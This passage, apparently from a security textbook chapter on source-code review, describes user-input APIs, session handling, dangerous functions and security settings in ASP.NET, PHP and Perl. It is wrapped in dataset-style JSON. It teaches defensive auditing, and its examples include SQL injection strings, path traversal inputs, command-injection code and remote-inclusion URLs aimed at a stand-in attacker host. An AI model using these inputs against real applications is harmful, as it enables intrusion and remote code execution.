string names to string\nvalues. This property returns a combined collection of all\nthese parameter types.\nItem Returns the named item from within the Params\ncollection.\nForm Returns a collection of the names and values of form\nvariables submitted by the user.\nQueryString Returns a collection of the names and values of variables\nwithin the query string in the request.\nServerVariables Returns a collection of the names and values of a large\nnumber of ASP server variables (akin to CGI variables),\nwhich includes the raw data of the request, query string,\nrequest method, HTTP Host header, and so on.\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 595\nChapter 18 ■ Finding Vulnerabilities in Source Code 595\nTable18-4 (continued)\nHeaders HTTP headers in the request are stored as a map of\nstring names to string values and can be accessed using\nthis property.\nUrl These properties return details of the URL contained\nwithin the request, including the query string.\nRawUrl\nUrlReferrer Returns information about the URL specified in the HTTP\nRefererheader in the request.\nCookies Returns a collection of Cookieobjects, which contain\ndetails of the cookies received in the request, including\ntheir names and values.\nFiles Returns a collection of files uploaded by the user.\nInputStream These APIs return different representations of the raw request\nreceived from the client and so can be used to access any of\nthe information obtained by all of the other APIs.\nBinaryRead\nHttpMethod Returns the method used in the HTTP request.\nBrowser Returns details of the user’s browser, as submitted in the\nHTTP User-Agentheader.\nUserAgent\nAcceptTypes Returns a string array of client-supported MIME types, as\nsubmitted in the HTTP Accept header.\nUserLanguages Returns a string array containing the languages accepted\nby the client, as submitted in the HTTP Accept-\nLanguageheader.\nSession Interaction\nThere are various ways in which ASP.NET applications can interact with the\nuser’s session to store and retrieve information.\nThe Session property provides a simple means to store and retrieve infor-\nmation within the current session. This is accessed in the same way as any\nother indexed collection:\nSession[“MyName”] = txtMyName.Text; // store user’s name\nlblWelcome.Text = “Welcome “ + Session[“MyName”];// retrieve user’s name\nASP.NET profiles work much like the Session property does, except that\nthey are tied to the user’s profile and so actually persist across different ses-\nsions belonging to the same user. Users are re-identified across sessions either\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 596\n596 Chapter 18 ■ Finding Vulnerabilities in Source Code\nthrough authentication or via a unique persistent cookie. Data is stored and\nretrieved in the user profile as follows:\nProfile.MyName = txtMyName.Text; // store user’s name\nlblWelcome.Text = “Welcome “ + Profile.MyName; // retrieve user’s name\nThe System.Web.SessionState.HttpSessionState class provides another\nmeans of storing and retrieving information within the session. It stores infor-\nmation as a mapping from string names to object values, which can be\naccessed using the APIs listed in Table18-5.\nTable18-5: APIs Used to Interact with the User’s Session on the ASP.NET Platform\nAdd Adds a new item to the session collection.\nItem Gets or sets the value of a named item in the collection.\nKeys Returns the names of all items in the collection.\nGetEnumerator\nCopyTo Copies the collection of values to an array.\nPotentially Dangerous APIs\nThis section describes some common ASP.NET APIs that can introduce secu-\nrity vulnerabilities if used in an unsafe manner.\nFile Access\nSystem.IO.Fileis the main class used for accessing files in ASP.NET. All of its\nrelevant methods are static, and there is no public constructor.\nThe 37 methods of this class all take a filename as a parameter. Path traver-\nsal vulnerabilities may exist in every instance where user-controllable data is\npassed in without checking for dot-dot-slash sequences. For example, the fol-\nlowing code will open a file in the root of the C:\\drive on Windows:\nstring userinput = “..\\\\boot.ini”;\nFileStream fs = File.Open(“C:\\\\temp\\\\” + userinput,\nFileMode.OpenOrCreate);\nThe following classes are most commonly used for reading and writing file\ncontents:\n■■ System.IO.FileStream\n■■ System.IO.StreamReader\n■■ System.IO.StreamWriter\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 597\nChapter 18 ■ Finding Vulnerabilities in Source Code 597\nThey have various constructors which take a file path as a parameter. These\nmay introduce path traversal vulnerabilities if user-controllable data is passed.\nFor example:\nstring userinput = “..\\\\foo.txt”;\nFileStream fs = new FileStream(“F:\\\\tmp\\\\” + userinput,\nFileMode.OpenOrCreate);\nDatabase Access\nThere are numerous APIs for database access within ASP.NET, and the following\nare the main classes which can be used to create and execute a SQL statement:\n■■ System.Data.SqlClient.SqlCommand\n■■ System.Data.SqlClient.SqlDataAdapter\n■■ System.Data.Oledb.OleDbCommand\n■■ System.Data.Odbc.OdbcCommand\n■■ System.Data.SqlServerCe.SqlCeCommand\nEach of these classes has a constructor that takes a string containing a SQL\nstatement, and each has a CommandTextproperty that can be used to get and set\nthe current value of the SQL statement. When a command object has been suit-\nably configured, it is executed via a call to one of the various Executemethods.\nIf user-controllable input is part of the string being executed as a query, then\nthe application is probably vulnerable to SQL injection. For example:\nstring username = “admin’ or 1=1--”;\nstring password = “foo”;\nOdbcCommand c = new OdbcCommand(“SELECT * FROM users WHERE username = ‘“\n+ username + “‘ AND password = ‘“ + password + “‘“, connection);\nc.ExecuteNonQuery();\nwhich executes the unintended query\nSELECT * FROM users WHERE username = ‘admin’ or 1=1--’ AND password =\n‘foo’\nEach of the classes listedsupports prepared statements via their Parameters\nproperty, which allows an application to create a SQL statement containing\nparameter placeholders and set their values in a secure and typesafe way.\nIf used as intended, this mechanism is not vulnerable to SQL injection. For\nexample:\nstring username = “admin’ or 1=1--”;\nstring password = “foo”;\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 598\n598 Chapter 18 ■ Finding Vulnerabilities in Source Code\nOdbcCommand c = new OdbcCommand(“SELECT * FROM users WHERE username =\n@username AND password = @password”, connection);\nc.Parameters.Add(new OdbcParameter(“@username”,\nOdbcType.Text).Value = username);\nc.Parameters.Add(new OdbcParameter(“@password”,\nOdbcType.Text).Value = password);\nc.ExecuteNonQuery();\nwhich results in a query that is equivalent to\nSELECT * FROM users WHERE username = ‘admin’’ or 1=1--’ AND password =\n‘foo’\nDynamic Code Execution\nThe VBScript function Eval takes a string argument containing a VBScript\nexpression. The function evaluates this expression and returns the result. If\nuser-controllable data is incorporated into the expression to be evaluated, then\nit might be possible to execute arbitrary commands or modify the applica-\ntion’s logic.\nThe functions Execute and ExecuteGlobal take a string containing ASP\ncode, which it executes just as if the code appeared directly within the script\nitself. The colon delimiter can be used to batch together multiple statements. If\nuser-controllable data is passed into the Executefunction, then the application\nis probably vulnerable to arbitrary command execution.\nOS Command Execution\nThe following APIs can be used in various ways to launch an external process\nfrom within an ASP.NET application:\n■■ System.Diagnostics.Start.Process\n■■ System.Diagnostics.Start.ProcessStartInfo\nA filename string can be passed to the static Process.Startmethod, or the\nStartInfo property of a Process object can be configured with a filename\nbefore calling Starton the object. If the filename string can be fully controlled\nby the user, then the application is almost certainly vulnerable to arbitrary\ncommand execution. For example, the following will cause the Windows calc\nprogram to run:\nstring userinput = “calc”;\nProcess.Start(userinput);\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 599\nChapter 18 ■ Finding Vulnerabilities in Source Code 599\nIf the user controls only part of the string passed to Start, then the applica-\ntion may still be vulnerable. For example:\nstring userinput = “..\\\\..\\\\..\\\\Windows\\\\System32\\\\calc”;\nProcess.Start(“C:\\\\Program Files\\\\MyApp\\\\bin\\\\” + userinput);\nThe API does not interpret shell metacharacters such as &and |, nor does it\naccept command-line arguments within the filename parameter, and so this\nkind of attack is the only one likely to succeed when the user controls only a\npart of the filename parameter.\nCommand-line arguments to the launched process can be set using the\nArguments property of the ProcessStartInfo class. If only the Arguments\nparameter is user-controllable, the application may still be vulnerable to some-\nthing other than code execution. For example, if an application executes the\nprogram wget with a user-controllable parameter as the target URL, then an\nattacker may be able to pass dangerous command-line parameters to the wget\nprocess—for example, causing it to download a document and save it to an\narbitrary location on the file system.\nURL Redirection\nThe following APIs can be used to issue an HTTP redirect in ASP.NET:\n■■ System.Web.HttpResponse.Redirect\n■■ System.Web.HttpResponse.Status\n■■ System.Web.HttpResponse.StatusCode\n■■ System.Web.HttpResponse.AddHeader\n■■ System.Web.HttpResponse.AppendHeader\n■■ Server.Transfer\nThe usual means of causing a redirect response is via the HttpResponse\n.Redirectmethod, which takes a string containing a relative or absolute URL.\nIf the value of this string is user-controllable, then the application is probably\nvulnerable to a phishing vector.\nYou should also be sure to review any uses of the Status/StatusCodeprop-\nerties and the AddHeader/AppendHeadermethods. Given that a redirect simply\ninvolves a 3xx response containing an HTTP Location header, an application\nmay implement redirects using these APIs.\nThe Server.Transfer method is also sometimes used to perform redirec-\ntion. However, this does not in fact cause an HTTP redirect, but rather simply\nchanges the page being processed on the server in response to the current\nrequest. Accordingly, it cannot be subverted to cause redirection to an off-site\nURL, and so it is usually less useful to an attacker.\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 600\n600 Chapter 18 ■ Finding Vulnerabilities in Source Code\nSockets\nThe System.Net.Sockets.Socketclass is used to create network sockets. After\na Socket object has been created, it is connected via a call to the Connect\nmethod, which takes the IP and port details of the target host as its parameters.\nIf this host information is user-controllable in any way, then the application\nmay be exploitable to cause network connections to arbitrary hosts, either on\nthe Internet or on the private DMZ or internal network on which the applica-\ntion is hosted.\nConfiguring the ASP.NET Environment\nThe Web.configXML file in the web root directory contains configuration set-\ntings for the ASP.NET environment, listed in Table 18-6, and controls how\napplications behave.\nTable18-6: Security-Relevant Configuration Settings for the ASP.NET Environment\nhttpCookies This element determines the security settings associated with\ncookies. If the httpOnlyCookiesattribute is set to true, then\ncookies will be flagged as HttpOnly, and so are not directly\naccessible from client-side scripts. If the requireSSLattribute is\nset to true, then cookies will be flagged as secure, and so will\nbe transmitted by browsers only within HTTPS requests.\nsessionState This element determines how sessions behave. The value\nof the timeoutattribute determines the time in minutes\nafter which an idle session will be expired. If the\nregenerateExpiredSessionIdelement is set to true\n(which is the default), then a new session ID will be issued\nwhen an expired session ID is received.\ncompilation This element determines whether debugging symbols are\ncompiled into pages, resulting in more verbose debug error\ninformation. If the debugattribute is set to true, then debug\nsymbols will be included.\ncustomErrors This element determines whether the application returns detailed\nerror messages in the event of an unhandled error. If the mode\nattribute is set to Onor RemoteOnly, then the page identified by\nthe defaultRedirectattribute will be displayed to application\nusers, in place of detailed system-generated messages.\nhttpRuntime This element determines various runtime settings. If the\nenableHeaderCheckingattribute is set to true(which is\nthe default), then ASP.NET will check request headers for\npotential injection attacks, including cross-site scripting. If the\nenableVersionHeaderattribute is set to true(which is the\ndefault), then ASP.NET outputs a detailed version string, which\nmay be of use to an attacker in researching vulnerabilities in\nspecific versions of the platform."
  },
  {
    "input": "PHP",
    "output": "70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 601\nChapter 18 ■ Finding Vulnerabilities in Source Code 601\nIf sensitive data such as database connection strings are stored in the con-\nfiguration file, these should be encrypted using the ASP.NET “protected con-\nfiguration” feature.\nPHP\nThis section describes methods of acquiring user-supplied input, ways of\ninteracting with the user’s session, the potentially dangerous APIs that exist,\nand security-relevant configuration options on the PHP platform.\nIdentifying User-Supplied Data\nPHP uses a range of array variables to store user-submitted data, as listed in\nTable18-7.\nTable18-7: Variables Used to Acquire User-Supplied Data on the PHP Platform\n$_GET This array contains the parameters\nsubmitted in the query string. These are\n$HTTP_GET_VARS\naccessed by name. For example, in the\nfollowing URL\nhttps://wahh-app.com/\nsearch.php?query=foo\nthe value of the queryparameter is\naccessed using\n$_GET[‘query’]\n$_POST This array contains the parameters\nsubmitted in the request body.\n$HTTP_POST_VARS\n$_COOKIE This array contains the cookies\nsubmitted in the request.\n$HTTP_COOKIE_VARS\n$_REQUEST This array contains all of the items in\nthe $_GET, $_POST, and $_COOKIE\narrays.\n$_FILES This array contains the files uploaded in\nthe request.\n$HTTP_POST_FILES\n$_SERVER[‘REQUEST_METHOD’] Contains the method used in the HTTP\nrequest.\nContinued\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 602\n602 Chapter 18 ■ Finding Vulnerabilities in Source Code\nTable18-7 (continued)\n$_SERVER[‘QUERY_STRING’] Contains the full query string submitted\nin the request.\n$_SERVER[‘REQUEST_URI’] Contains the full URL contained in the\nrequest.\n$_SERVER[‘HTTP_ACCEPT’] Contains the contents of the HTTP\nAcceptheader.\n$_SERVER[‘HTTP_ACCEPT_CHARSET’] Contains the contents of the HTTP\nAccept-charsetheader.\n$_SERVER[‘HTTP_ACCEPT_ENCODING’] Contains the contents of the HTTP\nAccept-encodingheader.\n$_SERVER[‘HTTP_ACCEPT_LANGUAGE’] Contains the contents of the HTTP\nAccept-languageheader.\n$_SERVER[‘HTTP_CONNECTION’] Contains the contents of the HTTP\nConnectionheader.\n$_SERVER[‘HTTP_HOST’] Contains the contents of the HTTP\nHostheader.\n$_SERVER[‘HTTP_REFERER’] Contains the contents of the HTTP\nRefererheader.\n$_SERVER[‘HTTP_USER_AGENT’] Contains the contents of the HTTP\nUser-agentheader.\n$_SERVER[‘PHP_SELF’] Contains the name of the currently-\nexecuting script. Although the script\nname itself is outside an attacker’s\ncontrol, path information can be\nappended to this name. For example, if\na script contains the following code\n<form action=”<?=\n$_SERVER[‘PHP_SELF’] ?>”>\nthen an attacker can craft a cross-site\nscripting attack as follows:\n/search.php/”><script>...\netc....\nThere are various anomalies which you should keep in mind when attempting\nto identify ways in which a PHP application is accessing user-supplied input:\n■■ $GLOBALSis an array containing references to all variables which are\ndefined in the global scope of the script. It may be used to access other\nvariables by name.\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 603\nChapter 18 ■ Finding Vulnerabilities in Source Code 603\n■■ If the configuration directive register_globalsis enabled, then\nPHP creates global variables for all request parameters—that is, every-\nthing contained in the $_REQUESTarray. This means that an application\nmay access user input simply by referencing a variable with the same\nname as the relevant parameter. If an application uses this means of\naccessing user-supplied data, then there may be no way of identifying\nall instances of this other than via a careful line-by-line review of the\ncode base to find variables used in this way.\n■■ In addition to the standard HTTP headers identified previously, PHP\nadds an entry to the $_SERVERarray for any custom HTTP headers\nreceived in the request. For example, supplying the header\nFoo: Bar\ncauses\n$_SERVER[‘HTTP_FOO’] = “Bar”\n■■ Input parameters whose names contain subscripts in square brackets are\nautomatically converted into arrays. For example, requesting the URL\nhttps://wahh-app.com/search.php?query[a]=foo&query[b]=bar\nwill cause the value of the $_GET[‘query’]variable to be an array con-\ntaining two members. This may result in unexpected behavior within\nthe application if an array is passed to a function that expects a scalar\nvalue.\nSession Interaction\nPHP uses the $_SESSION array as a means of storing and retrieving informa-\ntion within the user’s session. For example:\n$_SESSION[‘MyName’] = $_GET[‘username’]; // store user’s name\necho “Welcome “ . $_SESSION[‘MyName’]; // retrieve user’s name\nThe $HTTP_SESSION_VARSarray may be used in the same way.\nIf register_globals is enabled (as discussed in the “Configuring the PHP\nEnvironment” section later in this chapter), global variables may be stored\nwithin the current session as follows:\n$MyName = $_GET[‘username’];\nsession_register(“MyName”);\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 604\n604 Chapter 18 ■ Finding Vulnerabilities in Source Code\nPotentially Dangerous APIs\nThis section describes some common PHP APIs which can introduce security\nvulnerabilities if used in an unsafe manner.\nFile Access\nPHP implements a large number of functions for accessing files, many of which\naccept URLs and other constructs that may be used to access remote files.\nThe following functions are used to read or write the contents of a specified\nfile. If user-controllable data is passed to these APIs, an attacker may be able to\nexploit these to access arbitrary files on the server file system.\n■■ fopen\n■■ readfile\n■■ file\n■■ fpassthru\n■■ gzopen\n■■ gzfile\n■■ gzpassthru\n■■ readgzfile\n■■ copy\n■■ rename\n■■ rmdir\n■■ mkdir\n■■ unlink\n■■ file_get_contents\n■■ file_put_contents\n■■ parse_ini_file\nThe following functions are used to include and evaluate a specified PHP\nscript. If an attacker can cause the application to evaluate a file which he con-\ntrols, then he can achieve arbitrary command execution on the server.\n■■ include\n■■ include_once\n■■ require\n■■ require_once\n■■ virtual\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 605\nChapter 18 ■ Finding Vulnerabilities in Source Code 605\nNote that even if it is not possible to include remote files, command execu-\ntion may still be achievable if a means exists of uploading arbitrary files to a\nlocation on the server.\nThe PHP configuration option allow_url_fopen can be used to prevent\nsome file functions from accessing remote files. However, by default this\noption is set to 1(meaning that remote files are allowed), so the protocols listed\nin Table18-8 can be used to retrieve a remote file.\nTable18-8: Network Protocols That Can be Used to Retrieve a Remote File\nHTTP, HTTPS http://wahh-attacker.com/bad.php\nFTP ftp://user:password@wahh-attacker.com/bad.php\nSSH ssh2.shell://user:pass@wahh-attacker.com:22/\nxterm\nssh2.exec://user:pass@wahh-attacker.com:22/cmd\nEven if allow_url_fopenis set to 0, the methods listed in Table18-9 may still\nenable an attacker to access remote files (depending on the extensions\ninstalled).\nTable 18-9: Methods That May Allow Access to Remote Files Even If allow_url_fopen Is\nSet to 0\nSMB \\\\wahh-attacker.com\\bad.php\nPHP input/output streams php://filter/resource=http://wahh-\nattacker.com/bad.php\nCompression streams compress.zlib://http://wahh-\nattacker.com/bad.php\nAudio streams ogg://http://wahh-attacker.com/bad.php\nNOTE From PHP 5.2 onwards there is a new option, allow_url_include,\nwhich is disabled by default. This default configuration prevents any of the\npreceding methods from being used to specify a remote file when calling one\nof the file include functions.\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 606\n606 Chapter 18 ■ Finding Vulnerabilities in Source Code\nDatabase Access\nThe following functions are used to send a query to a database, and retrieve\nthe results:\n■■ mysql_query\n■■ mssql_query\n■■ pg_query\nThe SQL statement is passed as a simple string. If user-controllable input is\npart of the string parameter, then the application is probably vulnerable to\nSQL injection. For example:\n$username = “admin’ or 1=1--”;\n$password = “foo”;\n$sql=”SELECT * FROM users WHERE username = ‘$username’ AND password =\n‘$password’”;\n$result = mysql_query($sql, $link)\nwhich executes the unintended query\nSELECT * FROM users WHERE username = ‘admin’ or 1=1--’ AND password =\n‘foo’\nThe following functions can be used to create prepared statements, allowing\nan application to create a SQL query containing parameter placeholders and\nset their values in a secure and typesafe way:\n■■ mysqli->prepare\n■■ stmt->prepare\n■■ stmt->bind_param\n■■ stmt->execute\n■■ odbc_prepare\nIf used as intended, this mechanism is not vulnerable to SQL injection. For\nexample:\n$username = “admin’ or 1=1--”;\n$password = “foo”;\n$sql = $db_connection->prepare(\n“SELECT * FROM users WHERE username = ? AND password = ?”);\n$sql->bind_param(“ss”, $username, $password);\n$sql->execute();\nwhich results in a query that is equivalent to\nSELECT * FROM users WHERE username = ‘admin’’ or 1=1--’ AND password =\n‘foo’\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 607\nChapter 18 ■ Finding Vulnerabilities in Source Code 607\nDynamic Code Execution\nThe following functions can be used to dynamically evaluate PHP code:\n■■ eval\n■■ call_user_func\n■■ call_user_func_array\n■■ call_user_method\n■■ call_user_method_array\n■■ create_function\nThe semicolon delimiter can be used to batch together multiple statements.\nIf user-controllable data is passed into any of these functions, then the appli-\ncation is probably vulnerable to script injection.\nThe function preg_replace, which performs a regular expression search\nand replace, can be used to run a specific piece of PHP code against every\nmatch, if called with the /eoption. If user-controllable data appears in the PHP\nthat is dynamically executed, then the application is probably vulnerable.\nAnother interesting feature of PHP is the ability to invoke functions dynam-\nically via a variable containing the name of the function. For example, the fol-\nlowing code will invoke the function specified in the func parameter of the\nquery string:\n<?php\n$var=$_GET[‘func’];\n$var();\n?>\nIn this situation, a user can cause the application to invoke an arbitrary func-\ntion (without parameters) by modifying the value of the func parameter. For\nexample, invoking the phpinfofunction will cause the application to output a\nlarge amount of information about the PHP environment, including configu-\nration options, OS information, and extensions.\nOS Command Execution\nThese functions can be used to execute operating system commands:\n■■ exec\n■■ passthru\n■■ popen\n■■ proc_open\n■■ shell_exec\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 608\n608 Chapter 18 ■ Finding Vulnerabilities in Source Code\n■■ system\n■■ The backtick operator (`)\nIn all these cases, commands can be chained together using the |character.\nIf user-controllable data is passed unfiltered into any of these functions, then\nthe application is probably vulnerable to arbitrary command execution.\nURL Redirection\nThe following APIs can be used to issue an HTTP redirect in PHP:\n■■ http_redirect\n■■ header\n■■ HttpMessage::setResponseCode\n■■ HttpMessage::setHeaders\nThe usual means of causing a redirect is via the http_redirect function,\nwhich takes a string containing a relative or absolute URL. If the value of this\nstring is user-controllable, then the application is probably vulnerable to a\nphishing vector.\nRedirects can also be performed by calling the header function with an\nappropriate Locationheader, which causes PHP to deduce that an HTTP redi-\nrect is required. For example:\nheader(“Location: /target.php”);\nCare should also be taken to review any uses of the setResponseCode and\nsetHeaders APIs. Given that a redirect simply involves a 3xx response con-\ntaining an HTTP Location header, an application may implement redirects\nusing these APIs.\nSockets\nThe following APIs can be used to create and use network sockets in PHP:\n■■ socket_create\n■■ socket_connect\n■■ socket_write\n■■ socket_send\n■■ socket_recv\n■■ fsockopen\n■■ pfsockopen\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 609\nChapter 18 ■ Finding Vulnerabilities in Source Code 609\nAfter a socket is created using socket_create, it is connected to a remote\nhost via a call to socket_connect, which takes the host and port details of the\ntarget as its parameters. If this host information is user-controllable in any\nway, then the application may be exploitable to cause network connections to\narbitrary hosts, either on the public Internet or on the private DMZ or internal\nnetwork on which the application is hosted.\nThe fsockopen and pfsockopen functions can be used to open sockets to a\nspecified host and port, and return a file pointer that can be used with regular\nfile functions such as fwrite and fgets. If user data is passed to these func-\ntions, then the application may be vulnerable as described previously.\nConfiguring the PHP Environment\nPHP configuration options are specified in the php.ini file, which uses the\nsame structure as Windows INI files. There are various options that can affect\nan application’s security. Many options that have historically caused problems\nhave been removed from the latest version of PHP.\nRegister Globals\nIf the register_globals directive is enabled, then PHP creates global vari-\nables for all request parameters. Given that PHP does not require variables to\nbe initialized before use, this option can easily lead to security vulnerabilities\nin which an attacker can cause a variable to be initialized to an arbitrary value.\nFor example, the following code checks a user’s credentials and sets the\n$authenticatedvariable to 1if they are valid:\nif (check_credentials($username, $password))\n{\n$authenticated = 1;\n}\n...\nif ($authenticated)\n{\n...\nBecause the $authenticated variable is not first explicitly initialized to 0,\nan attacker can bypass the login by submitting the request parameter\nauthenticated=1. This causes PHP to create the global variable $authenticated\nwith a value of 1, prior to the credentials check being performed.\nNOTE From PHP 4.2.0 onwards, the register_globalsdirective is\ndisabled by default. However, because many legacy applications depend upon\nregister_globalsfor their normal operation, you may often find that the\ndirective has been explicitly enabled in php.ini. The register_globals\noption was removed altogether in PHP 6.\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 610\n610 Chapter 18 ■ Finding Vulnerabilities in Source Code\nSafe Mode\nIf the safe_modedirective is enabled, then PHP places restrictions on the use of\nsome dangerous functions. Some functions are disabled altogether, while oth-\ners are subject to limitations on their use. For example:\n■■ The shell_execfunction is disabled because this can be used to execute\noperating system commands.\n■■ The mailfunction has the parameter additional_parametersdisabled\nbecause unsafe use of this parameter may lead to SMTP injection flaws\n(see Chapter 9).\n■■ The execfunction can only be used to launch executables within the\nconfigured safe_mode_exec_dir, and metacharacters within the com-\nmand string are automatically escaped.\nNOTE Not all dangerous functions are restricted by safe mode, and some\nrestrictions are affected by other configuration options. Further, various means\nexist of bypassing some safe mode restrictions. Safe mode should not be\nconsidered a panacea to security issues within PHP applications. Safe mode\nhas been removed from PHP version 6.\nMagic Quotes\nIf the magic_quotes_gpc directive is enabled, then any single quote, double\nquote, backslash, and NULLcharacters contained within request parameters are\nautomatically escaped using a backslash. If the magic_quotes_sybase direc-\ntive is enabled, then single quotes are instead escaped using a single quote.\nThis option is designed to protect vulnerable code containing unsafe database\ncalls from being exploitable via malicious user input. When reviewing the\napplication code base to identify any SQL injection flaws, you should be aware\nof whether magic quotes are enabled, because this will affect the application’s\nhandling of input.\nUsing magic quotes does not prevent all SQL injection attacks. As described\nin Chapter 9, an attack that injects into a numeric field does not need to use sin-\ngle quotation marks. Further, data whose quotes have been escaped may still\nbe used in a second-order attack when it is subsequently read back from the\ndatabase.\nThe magic quotes option may result in undesirable modification of user\ninput, when data is being processed in a context that does not require any\nescaping, resulting in the addition of slashes that need to be removed using the\nstripslashesfunction.\nSome applications perform their own escaping of relevant input by passing\nindividual parameters through the addslashes function only when required. If"
  },
  {
    "input": "Perl",
    "output": "70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 611\nChapter 18 ■ Finding Vulnerabilities in Source Code 611\nmagic quotes are enabled in the PHP configuration, then this approach will result\nin double-escaped characters, in which doubled-up slashes are interpreted as lit-\neral backslashes, leaving the potentially malicious character unescaped.\nBecause of the limitations and anomalies of the magic quotes option, it is\nrecommended that prepared statements be used for safe database access and\nthat the magic quotes option be disabled.\nNOTE The magic quotes option has been removed from PHP version 6.\nMiscellaneous\nTable18-10 contains some miscellaneous configuration options that can affect\nthe security of PHP applications.\nTable18-10: Miscellaneous PHP Configuration Options\nallow_url_fopen If disabled, this directive prevents some file functions from\naccessing remote files (as described previously).\nallow_url_include If disabled, this directive prevents the PHP file include\nfunctions from being used to include a remote file.\ndisplay_errors If disabled, this directive prevents PHP errors from being\nreported to the user’s browser. The log_errorsand\nerror_logoptions can be used to record error\ninformation on the server, for diagnostic purposes.\nfile_uploads If enabled, this directive causes PHP to allow file uploads\nover HTTP.\nupload_tmp_dir This directive can be used to specify the temporary\ndirectory used to store uploaded files. This can be used to\nensure that sensitive files are not stored in a world-\nreadable location.\nPerl\nThis section describes methods of acquiring user-supplied input, ways of\ninteracting with the user’s session, the potentially dangerous APIs that exist,\nand security-relevant configuration options on the Perl platform.\nThe Perl language is notorious for allowing developers to perform the same\ntask in a multitude of ways. Further, there are numerous Perl modules that can\nbe used to meet different requirements. Any unusual or proprietary modules in\nuse should be closely reviewed to identify whether they use any powerful or\ndangerous functions and thus may introduce the same vulnerabilities as if the\napplication made direct use of those functions.\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 612\n612 Chapter 18 ■ Finding Vulnerabilities in Source Code\nCGI.pm is a widely used Perl module for creating web applications, and\nprovides the APIs which you are most likely to encounter when performing a\ncode review of a web application written in Perl.\nIdentifying User-Supplied Data\nThe functions listed in Table18-11 are all members of the CGI query object.\nTable18-11: CGI Query Members Used to Acquire User-Supplied Data\nparam Called without parameters, paramreturns a list of all the\nparameter names in the request.\nparam_fetch\nCalled with the name of a parameter, paramreturns the\nvalue of that request parameter.\nThe param_fetchmethod returns an array of the named\nparameters.\nVars This returns a hash mapping of parameter names to values.\ncookie The value of a named cookie can be set and retrieved using\nthe cookiefunction.\nraw_cookie\nThe raw_cookiefunction returns the entire contents of the\nHTTP Cookieheader, without any parsing having been\nperformed.\nself_url These functions return the current URL, in the first case\nincluding any query string.\nurl\nquery_string This function returns the query string of the current request.\nreferer This function returns the value of the HTTP Refererheader.\nrequest_method This function returns the value of the HTTP method used in\nthe request.\nuser_agent This function returns the value of the HTTP User-agent\nheader.\nhttp These functions return a list of all the HTTP environment\nvariables derived from the current request.\nhttps\nReadParse This function creates an array named %inthat contains the\nnames and values of all the request parameters.\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 613\nChapter 18 ■ Finding Vulnerabilities in Source Code 613\nSession Interaction\nThe Perl module CGISession.pm extends the CGI.pm module and provides\nsupport for session tracking and data storage. For example:\n$q->session_data(“MyName”=>param(“username”)); // store user’s name\nprint “Welcome “ . $q->session_data(“MyName”); // retrieve user’s name\nPotentially Dangerous APIs\nThis section describes some common Perl APIs which can introduce security\nvulnerabilities if used in an unsafe manner.\nFile Access\nThe following APIs can be used to access files in Perl:\n■■ open\n■■ sysopen\nThe openfunction is used to read and write the contents of a specified file. If\nuser-controllable data is passed as the filename parameter, an attacker may be\nable to access arbitrary files on the server file system.\nFurther, if the filename parameter begins or ends with the pipe character,\nthen the contents of this parameter are passed to a command shell. If an\nattacker can inject data containing shell metacharacters such as the pipe or\nsemicolon, then they may be able to perform arbitrary command execution.\nFor example, in the following code, an attacker can inject into the $useraddr\nparameter to execute system commands:\n$useraddr = $query->param(“useraddr”);\nopen (MAIL, “| /usr/bin/sendmail $useraddr”);\nprint MAIL “To: $useraddr\\n”;\n...\nDatabase Access\nThe selectall_arrayref function is used to send a query to a database, and\nretrieve the results as an array of arrays. The do function is used to execute a\nquery and simply return the number of rows affected. In both cases, the SQL\nstatement is passed as a simple string.\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 614\n614 Chapter 18 ■ Finding Vulnerabilities in Source Code\nIf user-controllable input comprises part of the string parameter, then the\napplication is probably vulnerable to SQL injection. For example:\nmy $username = “admin’ or 1=1--”;\nmy $password = “foo”;\nmy $sql=”SELECT * FROM users WHERE username = ‘$username’ AND password =\n‘$password’”;\nmy $result = $db_connection->selectall_arrayref($sql)\nwhich executes the unintended query\nSELECT * FROM users WHERE username = ‘admin’ or 1=1--’ AND password =\n‘foo’\nThe functions prepare and execute can be used to create prepared state-\nments, allowing an application to create a SQL query containing parameter\nplaceholders and set their values in a secure and typesafe way. If used as\nintended, this mechanism is not vulnerable to SQL injection. For example:\nmy $username = “admin’ or 1=1--”;\nmy $password = “foo”;\nmy $sql = $db_connection->prepare(“SELECT * FROM users WHERE username =\n? AND password = ?”);\n$sql->execute($username, $password);\nwhich results in a query that is equivalent to\nSELECT * FROM users WHERE username = ‘admin’’ or 1=1--’ AND password =\n‘foo’\nDynamic Code Execution\nEval can be used to dynamically execute a string containing Perl code. The\nsemicolon delimiter can be used to batch together multiple statements. If user-\ncontrollable data is passed into this function, then the application is probably\nvulnerable to script injection.\nOS Command Execution\nThe following functions can be used to execute operating system commands:\n■■ system\n■■ exec\n70779c18.qxd:WileyRed 9/14/07 3:15 PM Page 615\nChapter 18 ■ Finding Vulnerabilities in Source Code 615\n■■ qx\n■■ The backtick operator (`)\nIn all these cases, commands can be chained together using the |character.\nIf user-controllable data is passed unfiltered into any of these functions, then\nthe application is probably vulnerable to arbitrary command execution.\nURL Redirection\nThe redirect function, which is a member of the CGI query object, takes a\nstring containing a relative or absolute URL, to which the user is redirected. If\nthe value of this string is user-controllable, then the application is probably\nvulnerable to a phishing vector.\nSockets\nAfter a socket is created using socket, it is connected to a remote host via a call\nto connect, which takes a sockaddr_instructure comprising the host and port\ndetails of the target. If this host information is user-controllable in any way,\nthen the application may be exploitable to cause network connections to arbi-\ntrary hosts, either on the Internet or on the private DMZ or internal network\non which the application is hosted.\nConfiguring the Perl Environment\nPerl provides a taint mode, which helps to 